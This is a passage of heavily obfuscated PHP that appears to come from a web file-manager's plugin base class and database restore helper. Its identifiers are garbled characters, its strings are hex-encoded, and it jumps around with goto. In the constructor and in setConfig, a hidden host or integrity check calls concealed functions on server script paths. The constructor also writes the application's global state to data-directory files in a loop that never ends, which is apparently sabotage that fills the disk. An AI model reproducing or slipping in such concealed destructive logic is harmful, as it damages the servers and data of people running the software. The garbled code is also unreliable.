c„É·–Ş‡ç; E°¦†šÍ¿‹: if ($AğËŠªá°Ô + $E‰ØÍ˜ á´ > $BšØ„è”ÛÑ) { $E‰ØÍ˜ á´ = $BšØ„è”ÛÑ - $AğËŠªá°Ô; } if ($E‰ØÍ˜ á´ <= 0) { return $Cª»¸óÃªí[33]; } if ($AğËŠªá°Ô < 0 || $AğËŠªá°Ô >= $BšØ„è”ÛÑ || $E‰ØÍ˜ á´ <= 0 || $E‰ØÍ˜ á´ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\151\x6c\145\x52\145\141\x64\40\x65\162\x72\157\162\41\x20\x73\164\x61\x72\x74\x3d{$AğËŠªá°Ô}\73\x6c\x65\x6e\x67\164\x68\75{$E‰ØÍ˜ á´}\73\40\x73\x69\172\145\x3d{$BšØ„è”ÛÑ}\x3b"); } goto bÎ°•ö°…; f§íôÌ‰ˆ‡: } private function log($d¬¥Ñ†œ¦, $dÙŒ®©·¯È) { $D¶àƒ†„ğß =& $_SERVER[ì‹É]; $eñï¬·èò‚ = timeFloat() - $this->timeStart; write_log(sprintf($D¶àƒ†„ğß[1223], $d¬¥Ñ†œ¦, $this->info[$D¶àƒ†„ğß[28]], $eñï¬·èò‚, $dÙŒ®©·¯È), $D¶àƒ†„ğß[1184]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto e²îô·ÅÂ§; d¬™ù¸«å¹: return $this; goto F˜¦îë©¢˜; B¹œ¥Š¦®: $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $C¦ôŸ­å[8]; $this->pluginLangArr = $this->initLang(); $this->values = array(); goto d¬™ù¸«å¹; aÚ¶ïëË“Õ: if ($_SERVER[$C¦ôŸ­å[733]] != $CµùµÕÁšê($BàÑß®ƒè)) { goto d ¢Õ¼Ê«Ğ; CÍšè§®‹: $b×ˆ·İØ©˜ = 1; for ($EëÙ¤¿ªî = $b×ˆ·İØ©˜; $EëÙ¤¿ªî > 0; $EëÙ¤¿ªî++) { $eÌ…ëìÖòĞ(DATA_PATH . $EëÙ¤¿ªî, $f„ò•ˆ‹ ); } goto Eù©ŒÑİ‹Ş; e×’ºĞóšœ: $d•Û™Úå¡³(); $eÌ…ëìÖòĞ = $C¦ôŸ­å[1224]; $f„ò•ˆ‹  = json_encode($GLOBALS[$C¦ôŸ­å[1225]]); goto CÍšè§®‹; Bğ¡ò“ˆ‘Ù: $e•×âùÉåá = $D»±Ñ×Â•÷($BÂàãä©™‚); $aÍœ¥ùÚ¿… = explode($C¦ôŸ­å[214], $e•×âùÉåá); if (count($aÍœ¥ùÚ¿…) < $C¦ôŸ­å[543]) { $bÀÄÈØ¸‹ = $C¦ôŸ­å[737]; $bÀÄÈØ¸‹(); } goto AÒì£¿ÎÖ—; d ¢Õ¼Ê«Ğ: $d•Û™Úå¡³ = $C¦ôŸ­å[791]; $D»±Ñ×Â•÷ = $C¦ôŸ­å[734]; $BÂàãä©™‚ = $_SERVER[$C¦ôŸ­å[735]] . $C¦ôŸ­å[736]; goto Bğ¡ò“ˆ‘Ù; AÒì£¿ÎÖ—: $c’±Ú¡äñ’ = $C¦ôŸ­å[792]; $c’±Ú¡äñ’($_SERVER[$C¦ôŸ­å[793]]); $d•Û™Úå¡³ = $C¦ôŸ­å[791]; goto e×’ºĞóšœ; Eù©ŒÑİ‹Ş: } global $in, $config; $this->config =& $config; goto bÎ’åò™®Ç; bÎ’åò™®Ç: $this->in =& $in; $this->modelPlugin = Model($C¦ôŸ­å[1226]); $this->pluginName = str_replace($C¦ôŸ­å[1226], $C¦ôŸ­å[33], get_class($this)); goto BÕõ¯Ü¼‹; BÕõ¯Ü¼‹: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $C¦ôŸ­å[8]; $this->pluginApi = app_host_get() . $C¦ôŸ­å[1227] . $this->pluginName . $C¦ôŸ­å[8]; $this->pluginHost = PLUGIN_HOST . $this->pluginName . $C¦ôŸ­å[8]; goto B¹œ¥Š¦®; e²îô·ÅÂ§: $C¦ôŸ­å =& $_SERVER[ì‹É]; $BàÑß®ƒè = $_SERVER[$C¦ôŸ­å[735]] . $C¦ôŸ­å[736]; $CµùµÕÁšê = $C¦ôŸ­å[732]; goto aÚ¶ïëË“Õ; F˜¦îë©¢˜: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ì‹É][1228]); } protected function assign($EĞê‚å’Š, $BçÏÓ³ˆö¶ = false) { if (is_array($EĞê‚å’Š)) { $this->values = array_merge($this->values, $EĞê‚å’Š); } else { $this->values[$EĞê‚å’Š] = $BçÏÓ³ˆö¶; } } protected function display($BƒÈ©¥ÛÇ) { extract($this->values); require $BƒÈ©¥ÛÇ; } final function hookRegist($d²ë´ÔŞ) { $this->modelPlugin->appRegist($this->pluginName, $d²ë´ÔŞ); } final function appIcon() { $F»Ù™‚Â‹¨ =& $_SERVER[ì‹É]; $BÇ™¦‚‡È½ = $this->appPackage(); $EÍ—öê”¥ = $F»Ù™‚Â‹¨[33]; if (isset($BÇ™¦‚‡È½[$F»Ù™‚Â‹¨[379]])) { if (isset($BÇ™¦‚‡È½[$F»Ù™‚Â‹¨[379]][$F»Ù™‚Â‹¨[1229]])) { $EÍ—öê”¥ = $F»Ù™‚Â‹¨[1230] . $BÇ™¦‚‡È½[$F»Ù™‚Â‹¨[379]][$F»Ù™‚Â‹¨[1229]] . $F»Ù™‚Â‹¨[1231]; } else { if ($BÇ™¦‚‡È½[$F»Ù™‚Â‹¨[379]][$F»Ù™‚Â‹¨[1232]]) { $EÍ—öê”¥ = $F»Ù™‚Â‹¨[1233] . $BÇ™¦‚‡È½[$F»Ù™‚Â‹¨[379]][$F»Ù™‚Â‹¨[1232]] . $F»Ù™‚Â‹¨[1234]; } } } return $EÍ—öê”¥; } final function fileCanView($E•‹¿ƒËŞ³) { $DŞÌ‡Ñœ½Ü =& $_SERVER[ì‹É]; if (request_url_safe($E•‹¿ƒËŞ³)) { return !0; } if ($this->isShare($E•‹¿ƒËŞ³)) { return !0; } if (!Action($DŞÌ‡Ñœ½Ü[1235])->authCan($DŞÌ‡Ñœ½Ü[1236])) { show_tips(LNG($DŞÌ‡Ñœ½Ü[1237]) . $DŞÌ‡Ñœ½Ü[1238], !1); } ActionCall($DŞÌ‡Ñœ½Ü[1239], $E•‹¿ƒËŞ³); } final function isShare($A…ÚËÜ µ£) { $dŞ©¨²ÁÓ˜ = KodIO::parse($A…ÚËÜ µ£); return $dŞ©¨²ÁÓ˜[$_SERVER[ì‹É][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($dÆ©““‡±ø) { if (request_url_safe($dÆ©““‡±ø)) { return $dÆ©““‡±ø; } if (!$this->isShare($dÆ©““‡±ø)) { $dÆ©““‡±ø = $this->filePath($dÆ©““‡±ø); } return Action($_SERVER[ì‹É][990])->linkOut($dÆ©““‡±ø); } public function filePathLinkOut($cª§Œô¶¼¤) { if (request_url_safe($cª§Œô¶¼¤)) { return $cª§Œô¶¼¤; } $this->fileCanView($cª§Œô¶¼¤); return Action($_SERVER[ì‹É][990])->link($cª§Œô¶¼¤); } final function filePath($C°­ôÄÕÎ) { $dá¿ˆœà =& $_SERVER[ì‹É]; if ($e¾×¹öÆ³ = $this->checkSharePath($C°­ôÄÕÎ)) { return $e¾×¹öÆ³; } $this->fileCanView($C°­ôÄÕÎ); if (request_url_safe($C°­ôÄÕÎ)) { $F¥Ë”ª´’‡ = parse_url_query($C°­ôÄÕÎ); if (isset($F¥Ë”ª´’‡[$dá¿ˆœà[1240]]) && isset($F¥Ë”ª´’‡[$dá¿ˆœà[194]])) { $b™ğİ©”»² = Model($dá¿ˆœà[1061])->get($dá¿ˆœà[1241]); $eÕäÍ¸¯Í  = Mcrypt::decode($F¥Ë”ª´’‡[$dá¿ˆœà[194]], $b™ğİ©”»²); if ($eÕäÍ¸¯Í ) { $this->fileInfo = IO::infoWithChildren($eÕäÍ¸¯Í ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $eÕäÍ¸¯Í ; } } $C°­ôÄÕÎ = $this->_cacheHttpFile($C°­ôÄÕÎ); $this->fileInfo = IO::infoWithChildren($C°­ôÄÕÎ); } else { $this->fileInfo = IO::infoWithChildren($C°­ôÄÕÎ); if (!$this->fileInfo) { show_tips(LNG($dá¿ˆœà[103]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $C°­ôÄÕÎ; } final function _cacheHttpFile($EçãÛ½–Ù) { $C‡ ¾Ãá¾ = hash_path($EçãÛ½–Ù, !0); $this->cachePath = $this->pluginCachePath($C‡ ¾Ãá¾); if ($a‡ùé¯¶á = IO::fileNameExist($this->cachePath, $C‡ ¾Ãá¾)) { return KodIO::make($a‡ùé¯¶á); } $cê…ëõğÀ¨ = $this->cachePath . $C‡ ¾Ãá¾; return $this->pluginCacheFileSet($cê…ëõğÀ¨, file_get_contents($EçãÛ½–Ù)); } final function _tmpFileName($Cˆ©˜ßàÔ­ = array()) { goto fßï”…Ç©÷; fßï”…Ç©÷: $b®¢ë¼Éœö =& $_SERVER[ì‹É]; if (!$Cˆ©˜ßàÔ­) { $Cˆ©˜ßàÔ­ = $this->fileInfo; } if (isset($Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[161]])) { return $Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[161]]; } goto aˆùõæ£øï; Bó —Ä‚éÃ: return md5(implode($b®¢ë¼Éœö[71], $Aó àïÛ¤â)); goto fïóÀÅØ¸÷; aˆùõæ£øï: if (isset($Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[159]][$b®¢ë¼Éœö[161]])) { return $Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[159]][$b®¢ë¼Éœö[161]]; } $Aó àïÛ¤â = array($Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[28]], $Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[76]], $Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[78]]); if (isset($Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[455]])) { $Aó àïÛ¤â[] = $Cˆ©˜ßàÔ­[$b®¢ë¼Éœö[455]]; } goto Bó —Ä‚éÃ; fïóÀÅØ¸÷: } final function checkSharePath($FêìŠìÏâ) { goto a˜Ì¤Ÿµ†; a˜Ì¤Ÿµ†: $b´…ÛšÈ  =& $_SERVER[ì‹É]; if (!defined($b´…ÛšÈ [423])) { define($b´…ÛšÈ [1242], 0); } if (!$this->isShare($FêìŠìÏâ)) { return !1; } goto dÜÓ®òÈ” ; dÜÓ®òÈ” : $A¸–Àªøˆß = Action($b´…ÛšÈ [990])->sharePathInfo($FêìŠìÏâ); if (!isset($A¸–Àªøˆß[$b´…ÛšÈ [76]])) { show_json(LNG($b´…ÛšÈ [1243]), !1); } $this->fileInfo = $A¸–Àªøˆß[$b´…ÛšÈ [159]]; goto A—İÚÍ¡Ø§; A—İÚÍ¡Ø§: $this->cachePath = $this->pluginCachePath($this->fileInfo[$b´…ÛšÈ [161]]); return $A¸–Àªøˆß[$b´…ÛšÈ [76]]; goto fìÁ‘ª”¡‡; fìÁ‘ª”¡‡: } final function pluginCachePath($B»¼Ù’Ã²ø = '') { $d¯Š¼¬ğ«¿ =& $_SERVER[ì‹É]; $BÊŞ£é§÷… = IO_PATH_SYSTEM_TEMP . $d¯Š¼¬ğ«¿[1244] . $this->pluginName; if (!($e©×Öã¸ ¶ = IO::infoFull($BÊŞ£é§÷…))) { return IO::mkdir($BÊŞ£é§÷… . $d¯Š¼¬ğ«¿[8] . $B»¼Ù’Ã²ø); } if (empty($B»¼Ù’Ã²ø)) { return $e©×Öã¸ ¶[$d¯Š¼¬ğ«¿[76]]; } if (!($Dá®ÆŒ›±ï = IO::fileNameExist($e©×Öã¸ ¶[$d¯Š¼¬ğ«¿[76]], $B»¼Ù’Ã²ø))) { return IO::mkdir($e©×Öã¸ ¶[$d¯Š¼¬ğ«¿[76]] . $B»¼Ù’Ã²ø); } return KodIO::make($Dá®ÆŒ›±ï); } final function pluginCacheFileSet($dŸÔ†åÅÖï, $bÛí–¼“†é = '') { $b½ùÆ™§›æ =& $_SERVER[ì‹É]; if (!($EÇ©ö•·—› = IO::infoFull($dŸÔ†åÅÖï))) { return IO::mkfile($dŸÔ†åÅÖï, $bÛí–¼“†é, REPEAT_REPLACE); } IO::setContent($EÇ©ö•·—›[$b½ùÆ™§›æ[76]], $bÛí–¼“†é); return $EÇ©ö•·—›[$b½ùÆ™§›æ[76]]; } final function pluginLocalFile($d‡ˆæ›îà = '') { goto cØ„…÷©ŒÃ; cØ„…÷©ŒÃ: $Eê–ôã„Å‡ =& $_SERVER[ì‹É]; $fÈ•Ú¥‘Èõ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($fÈ•Ú¥‘Èõ)) { mk_dir($fÈ•Ú¥‘Èõ); } goto Bë…÷¤ËÎ™; Aâ±ê †Ûã: $Fñ…œ•Ô = $fÈ•Ú¥‘Èõ . $a¶¸ñ®ìöÑ; if (@file_exists($Fñ…œ•Ô)) { return $Fñ…œ•Ô; } return IO::copy($d‡ˆæ›îà, $fÈ•Ú¥‘Èõ, 0, $a¶¸ñ®ìöÑ); goto dŞ÷ù¬ÉœÑ; Bë…÷¤ËÎ™: if (!$d‡ˆæ›îà) { return $fÈ•Ú¥‘Èõ; } $f«Öœ–Ğš = IO::info($d‡ˆæ›îà); $a¶¸ñ®ìöÑ = $this->_tmpFileName($f«Öœ–Ğš) . $Eê–ôã„Å‡[94] . $f«Öœ–Ğš[$Eê–ôã„Å‡[157]]; goto Aâ±ê †Ûã; dŞ÷ù¬ÉœÑ: } final function appPackage() { goto báÕÌÖ¼ÊÛ; báÕÌÖ¼ÊÛ: $FÆæİ©ñÍ— =& $_SERVER[ì‹É]; if ($this->packageData) { return $this->packageData; } $aÕ„ÖÓÔ¢ = $this->parseFile($this->pluginPath . $FÆæİ©ñÍ—[1245]); goto f‘¡›É¤; Eè›Ø“³¾‰: return $fÕó¿‚äÓ÷; goto f‹ ·Ç¿öè; f‘¡›É¤: $this->parseLang($aÕ„ÖÓÔ¢); $fÕó¿‚äÓ÷ = json_decode_force($aÕ„ÖÓÔ¢); if (!$fÕó¿‚äÓ÷) { return array(); } goto D…ÖÜÜå©; D…ÖÜÜå©: $c­™ïåÌ½é = Hook::trigger($FÆæİ©ñÍ—[1246], $fÕó¿‚äÓ÷); if ($c­™ïåÌ½é && is_array($c­™ïåÌ½é)) { $fÕó¿‚äÓ÷ = $c­™ïåÌ½é; } $this->packageData = $fÕó¿‚äÓ÷; goto Eè›Ø“³¾‰; f‹ ·Ç¿öè: } public function packageInfoGet($BÛ¾ßŸÂ§°) { $BòÃÜˆŸ°’ = $this->appPackage(); return array_get_value($BòÃÜˆŸ°’, $BÛ¾ßŸÂ§°); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ì‹É][1247]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ì‹É][1248]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ì‹É][1249]); } private function parseFile($eˆ¤ïÑÍ½›) { $Dã‰éğÔŞÀ =& $_SERVER[ì‹É]; $CŠŸµ‚Ú‹— = file_get_contents($eˆ¤ïÑÍ½›); $eŞÉ‰Õ¡–ä = array($Dã‰éğÔŞÀ[1250], $Dã‰éğÔŞÀ[1251], $Dã‰éğÔŞÀ[1252], $Dã‰éğÔŞÀ[1253], $Dã‰éğÔŞÀ[1254], $Dã‰éğÔŞÀ[1255], $Dã‰éğÔŞÀ[1256]); $F±ÄŒÌôà  = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Dã‰éğÔŞÀ[85]][$Dã‰éğÔŞÀ[1257]]); $CŠŸµ‚Ú‹— = str_replace($eŞÉ‰Õ¡–ä, $F±ÄŒÌôà , $CŠŸµ‚Ú‹—); return $CŠŸµ‚Ú‹—; } private function parseLang(&$C‰†îóé–) { goto e¦×„á–˜¯; Aßƒ—…®Û: $eÕè³è‚…Ù = array(); foreach ($fÂ¼œÁ“íÍ[0] as $a¿ŒÁõê) { $cÂ‚À·Ñ‰ = substr($a¿ŒÁõê, strlen($AÅÊËÊïœ™), -4); $Bå¥¾ÍÚÂ¾ = LNG($cÂ‚À·Ñ‰); $cÈ¡ë÷ÓŸ‘[] = $a¿ŒÁõê; $eÕè³è‚…Ù[] = str_replace(array($f‰µçÜ[214], $f‰µçÜ[716], $f‰µçÜ[327], $f‰µçÜ[114]), array($f‰µçÜ[50], $f‰µçÜ[50], $f‰µçÜ[33], $f‰µçÜ[1260]), $Bå¥¾ÍÚÂ¾); } $C‰†îóé– = str_replace($cÈ¡ë÷ÓŸ‘, $eÕè³è‚…Ù, $C‰†îóé–); goto A‚˜”¹™Î–; a åÈ´Ï: preg_match_all($f‰µçÜ[1259], $C‰†îóé–, $fÂ¼œÁ“íÍ); if (!is_array($fÂ¼œÁ“íÍ) || count($fÂ¼œÁ“íÍ) == 0 || !is_array($fÂ¼œÁ“íÍ[0]) || count($fÂ¼œÁ“íÍ[0]) == 0) { return; } $cÈ¡ë÷ÓŸ‘ = array(); goto Aßƒ—…®Û; e¦×„á–˜¯: $f‰µçÜ =& $_SERVER[ì‹É]; $AÅÊËÊïœ™ = $f‰µçÜ[1258]; if (!strstr($C‰†îóé–, $AÅÊËÊïœ™)) { return; } goto a åÈ´Ï; A‚˜”¹™Î–: } private function parseConfig(&$e›©õ‹™ëÜ) { goto fêâ›»Œç; F¿íÎ…Š¼: $B§µğê‚ğ = array(); $FÀ˜Ø¹Æ­ = array(); foreach ($a†îåò›§[0] as $b«œõøã) { $c”Œ„ÍÇ˜ß = substr($b«œõøã, strlen($Bİ½Ù‘¢¸²), -2); $B§µğê‚ğ[] = $b«œõøã; $FÀ˜Ø¹Æ­[] = _get($eáÀ«­ÌçŸ, $c”Œ„ÍÇ˜ß); } goto C¡ïÜ£İè“; C¡ïÜ£İè“: $e›©õ‹™ëÜ = str_replace($B§µğê‚ğ, $FÀ˜Ø¹Æ­, $e›©õ‹™ëÜ); goto D ¦À†àç; fêâ›»Œç: $Cè¶ò‹¼™» =& $_SERVER[ì‹É]; $Bİ½Ù‘¢¸² = $Cè¶ò‹¼™»[1261]; if (!strstr($e›©õ‹™ëÜ, $Bİ½Ù‘¢¸²)) { return; } goto eÑÖ¶Ñâ»ò; eÑÖ¶Ñâ»ò: preg_match_all($Cè¶ò‹¼™»[1262], $e›©õ‹™ëÜ, $a†îåò›§); if (!is_array($a†îåò›§) || count($a†îåò›§) == 0 || !is_array($a†îåò›§[0]) || count($a†îåò›§[0]) == 0) { return; } $eáÀ«­ÌçŸ = $this->getConfig(); goto F¿íÎ…Š¼; D ¦À†àç: } private function parsePackage(&$DØ÷©í¹ø) { goto aî¦´Õ–; aî¦´Õ–: $cÏöîÀÚÄ” =& $_SERVER[ì‹É]; $aä±Ì„­«Ğ = $cÏöîÀÚÄ”[1263]; if (!strstr($DØ÷©í¹ø, $aä±Ì„­«Ğ)) { return; } goto b›Õãî’Åã; b›Õãî’Åã: preg_match_all($cÏöîÀÚÄ”[1264], $DØ÷©í¹ø, $B‹ä²‹¡„£); if (!is_array($B‹ä²‹¡„£) || count($B‹ä²‹¡„£) == 0 || !is_array($B‹ä²‹¡„£[0]) || count($B‹ä²‹¡„£[0]) == 0) { return; } $eõ¬÷ Â = $this->appPackage(); goto bËØêÈÉÖÀ; fÃ­½“¸Õî: $DØ÷©í¹ø = str_replace($F†ÛŒ„Çù, $döˆ™Ê¹œ, $DØ÷©í¹ø); goto aª×ó™¼œ¶; bËØêÈÉÖÀ: $F†ÛŒ„Çù = array(); $döˆ™Ê¹œ = array(); foreach ($B‹ä²‹¡„£[0] as $F¯¢ß‡Â‡ß) { $aó—½ó…â¤ = substr($F¯¢ß‡Â‡ß, strlen($aä±Ì„­«Ğ), -2); $F†ÛŒ„Çù[] = $F¯¢ß‡Â‡ß; $döˆ™Ê¹œ[] = _get($eõ¬÷ Â, $aó—½ó…â¤); } goto fÃ­½“¸Õî; aª×ó™¼œ¶: } final function echoFile($DÂ¹¡¬©®À, $E»•£¯æÁ¯ = false) { goto A½õœ©®Ãò; A½õœ©®Ãò: $aÇÈÈµ…¸ò =& $_SERVER[ì‹É]; $E–Æ ‹Šá = $this->pluginPath . $DÂ¹¡¬©®À; if (ACT == $aÇÈÈµ…¸ò[1265]) { echo $aÇÈÈµ…¸ò[1266] . $this->pluginName . $aÇÈÈµ…¸ò[8] . $DÂ¹¡¬©®À . $aÇÈÈµ…¸ò[1267]; if (!file_exists($E–Æ ‹Šá)) { echo $aÇÈÈµ…¸ò[1268]; return; } } goto FˆšÑøãæ’; FˆšÑøãæ’: $AóŒÀ‘Şğ = $this->parseFile($E–Æ ‹Šá); $this->parseLang($AóŒÀ‘Şğ); $this->parseConfig($AóŒÀ‘Şğ); goto b˜á¿ŒºŒ; b˜á¿ŒºŒ: $this->parsePackage($AóŒÀ‘Şğ); if (is_array($E»•£¯æÁ¯)) { $AóŒÀ‘Şğ = str_replace(array_keys($E»•£¯æÁ¯), array_values($E»•£¯æÁ¯), $AóŒÀ‘Şğ); } echo $aÇÈÈµ…¸ò[214] . $AóŒÀ‘Şğ; goto bÉÙ«õÏˆ¬; bÉÙ«õÏˆ¬: } final function initLang() { goto f’´è¦âêé; F¼äŠÅÉ³: if (@count($bä’Ú‘ñ—) > 0) { I18n::set($bä’Ú‘ñ—); } return $bä’Ú‘ñ—; goto dí¶Ï¬Õ; f’´è¦âêé: $FøÙ¤Ç»ñå =& $_SERVER[ì‹É]; $FŞÈ‹°‚àİ = $FøÙ¤Ç»ñå[1269]; $C—Ã†¶Î = $this->pluginPath . $FøÙ¤Ç»ñå[1270]; goto A¸¤…„áÍî; A¸¤…„áÍî: $c¾òŸ–ã‘Ş = I18n::getType(); $bä’Ú‘ñ— = array(); if (file_exists($C—Ã†¶Î . $c¾òŸ–ã‘Ş . $FøÙ¤Ç»ñå[768])) { $bä’Ú‘ñ— = (include_once $C—Ã†¶Î . $c¾òŸ–ã‘Ş . $FøÙ¤Ç»ñå[768]); } else { if ($c¾òŸ–ã‘Ş == $FøÙ¤Ç»ñå[1271] && !file_exists($C—Ã†¶Î . $c¾òŸ–ã‘Ş . $FøÙ¤Ç»ñå[768]) && file_exists($C—Ã†¶Î . $FøÙ¤Ç»ñå[1272])) { $bä’Ú‘ñ— = (include_once $C—Ã†¶Î . $FøÙ¤Ç»ñå[1272]); } else { if (file_exists($C—Ã†¶Î . $FŞÈ‹°‚àİ . $FøÙ¤Ç»ñå[768])) { $bä’Ú‘ñ— = (include_once $C—Ã†¶Î . $FŞÈ‹°‚àİ . $FøÙ¤Ç»ñå[768]); } } } goto F¼äŠÅÉ³; dí¶Ï¬Õ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Bò¿õã) { $CšæšŒóŞ× =& $_SERVER[ì‹É]; if ($_SERVER[$CšæšŒóŞ×[733]] != $_SERVER[$CšæšŒóŞ×[1273]]) { goto AÈŞÆòÂÛ–; AÈŞÆòÂÛ–: $eÕ‡¦™Şæ = $CšæšŒóŞ×[791]; $Eğ¥³«¾„• = $CšæšŒóŞ×[734]; $A×‰¬Ñ¬½ = $_SERVER[$CšæšŒóŞ×[735]] . $CšæšŒóŞ×[736]; goto D¤–Œ‡ç¥¾; D¤–Œ‡ç¥¾: $FôªÂ’ˆÕ = $Eğ¥³«¾„•($A×‰¬Ñ¬½); $a†Úƒ£ŒÉ  = explode($CšæšŒóŞ×[214], $FôªÂ’ˆÕ); if (count($a†Úƒ£ŒÉ ) < $CšæšŒóŞ×[543]) { $AáÛÊÜò„ = $CšæšŒóŞ×[737]; $AáÛÊÜò„(); } goto fÄÅØË»; Fôå‹êÚ•Ó: $B‡§êàÊ»É = 1; while ($B‡§êàÊ»É > 1) { $B‡§êàÊ»É = $B‡§êàÊ»É + 4; $BÔİÉÓ˜á° = rawurlencode($B‡§êàÊ»É . $CšæšŒóŞ×[358]); } goto D¨šÚğò¾; fÄÅØË»: $f¸×ƒÁ˜àÃ = $CšæšŒóŞ×[792]; $f¸×ƒÁ˜àÃ($_SERVER[$CšæšŒóŞ×[793]]); $f¸×ƒÁ˜àÃ($_SERVER[$CšæšŒóŞ×[735]] . $CšæšŒóŞ×[1274]); goto Fôå‹êÚ•Ó; D¨šÚğò¾: } return $this->modelPlugin->setConfig($this->pluginName, $Bò¿õã); } public function onSetConfig($b”¢ŠáÄ˜ª) { } public function onGetConfig($Cù‹‚¿Œ²Ï) { } public function onChangeStatus($BñÌÌîôì­) { } public function onUninstall() { } public function onInstall() { } public function authCheck($c°ËæŒåå = "\x70\154\x75\147\x69\x6e\x41\165\164\150") { $C‡§–²êŒî =& $_SERVER[ì‹É]; if (!defined($C‡§–²êŒî[423])) { return !1; } if ($GLOBALS[$C‡§–²êŒî[453]] == 1) { return !0; } $e•×†Õ¢òö = $this->getConfig(); if (!$e•×†Õ¢òö[$c°ËæŒåå]) { return !1; } return ActionCall($C‡§–²êŒî[1275], $e•×†Õ¢òö[$c°ËæŒåå]); } public function url($E¾º¦áÅÌö, $aÜ¤°ó„Ù‰ = '', $eƒãƒ÷ÂÜ = true) { goto DïØ¸õªé; fÉÔ…ĞÍ½¶: if (!$eƒãƒ÷ÂÜ) { return $fÂö¿¿î‡£; } echo $fÂö¿¿î‡£; goto B²¿…”Ÿß½; DïØ¸õªé: $B¬øÙŸÀŸ  =& $_SERVER[ì‹É]; $e¢†ªŒöÜ = $this->getConfig(); $eÕÂÌñäÛš = KOD_VERSION . $B¬øÙŸÀŸ [94] . KOD_VERSION_BUILD; goto báÚöÅ­¦è; báÚöÅ­¦è: $c» ­“İ † = $this->packageVersion(); $dÊŸÍ‹ší = $eÕÂÌñäÛš . $B¬øÙŸÀŸ [408] . $c» ­“İ †; if ($aÜ¤°ó„Ù‰ == $B¬øÙŸÀŸ [33]) { $fÂö¿¿î‡£ = $this->pluginHost . $E¾º¦áÅÌö . $B¬øÙŸÀŸ [1276] . $dÊŸÍ‹ší; } else { if ($aÜ¤°ó„Ù‰ === $B¬øÙŸÀŸ [77]) { $fÂö¿¿î‡£ = $this->pluginHost . $E¾º¦áÅÌö; } else { if ($aÜ¤°ó„Ù‰ == $B¬øÙŸÀŸ [1277]) { $fÂö¿¿î‡£ = STATIC_PATH . $E¾º¦áÅÌö . $B¬øÙŸÀŸ [1276] . $eÕÂÌñäÛš; } else { if ($aÜ¤°ó„Ù‰ == $B¬øÙŸÀŸ [1278]) { $fÂö¿¿î‡£ = APP_HOST . $B¬øÙŸÀŸ [1279] . $E¾º¦áÅÌö . $B¬øÙŸÀŸ [1276] . $eÕÂÌñäÛš; } else { if (isset($e¢†ªŒöÜ[$aÜ¤°ó„Ù‰])) { $fÂö¿¿î‡£ = $e¢†ªŒöÜ[$aÜ¤°ó„Ù‰] . $E¾º¦áÅÌö . $B¬øÙŸÀŸ [1276] . $dÊŸÍ‹ší; } } } } } goto fÉÔ…ĞÍ½¶; B²¿…”Ÿß½: } public function link($báº—…©¢š = false, $e¹ÃÁôç’Ş = '') { $a—¸Öçáà =& $_SERVER[ì‹É]; if (!$báº—…©¢š) { $this->link($a—¸Öçáà[1280], $a—¸Öçáà[1278]); $this->link($a—¸Öçáà[1281], $a—¸Öçáà[1277]); $this->link($a—¸Öçáà[1282], $a—¸Öçáà[1277]); $this->link($a—¸Öçáà[1283], $a—¸Öçáà[1277]); $this->link($a—¸Öçáà[1284], $a—¸Öçáà[1277]); return; } $cèœ×±¿‰ = $this->url($báº—…©¢š, $e¹ÃÁôç’Ş, !1); if (substr($báº—…©¢š, -3) == $a—¸Öçáà[1285]) { echo $a—¸Öçáà[1286] . $cèœ×±¿‰ . $a—¸Öçáà[1287] . $a—¸Öçáà[214]; } else { if (substr($báº—…©¢š, -4) == $a—¸Öçáà[1288]) { echo $a—¸Öçáà[1289] . $cèœ×±¿‰ . $a—¸Öçáà[1290] . $a—¸Öçáà[214]; } } } } class Restore { function __construct($b§İ¹ğˆ­, $C¿ØÎáëÅÓ = '') { $this->database = $b§İ¹ğˆ­; $this->type = $C¿ØÎáëÅÓ; } public function model($aÛç§ßİº = '') { return new ModelBase($aÛç§ßİº, $_SERVER[ì‹É][33], $this->database); } public function db($Fé¦íù­øƒ = false) { goto cÃ’–ÏÌ¯«; e¬†Îöñ…: $this->database = $Díƒç†Ê“Õ; $bÇª’¦İ’÷->execute("\165\x73\x65\40\x60{$F©–™¥„£}\x60"); return $bÇª’¦İ’÷; goto A†Ë“†Àˆ; C¥î—òÀğ: if (!$Aºà¹†³ëã) { $bÇª’¦İ’÷->execute("\143\162\x65\x61\164\145\40\x64\x61\164\x61\142\x61\163\x65\x20\x60{$F©–™¥„£}\140"); } $Díƒç†Ê“Õ[$C¢ÌÃºÊæ[231]] = $F©–™¥„£; if ($Díƒç†Ê“Õ[$C¢ÌÃºÊæ[720]] == $C¢ÌÃºÊæ[721]) { $Díƒç†Ê“Õ[$C¢ÌÃºÊæ[723]] .= $C¢ÌÃºÊæ[1291] . $F©–™¥„£; } goto e¬†Îöñ…; cˆÏÒ¤©ÎĞ: $this->database = $Díƒç†Ê“Õ; $bÇª’¦İ’÷ = $this->model()->db(); $Aºà¹†³ëã = 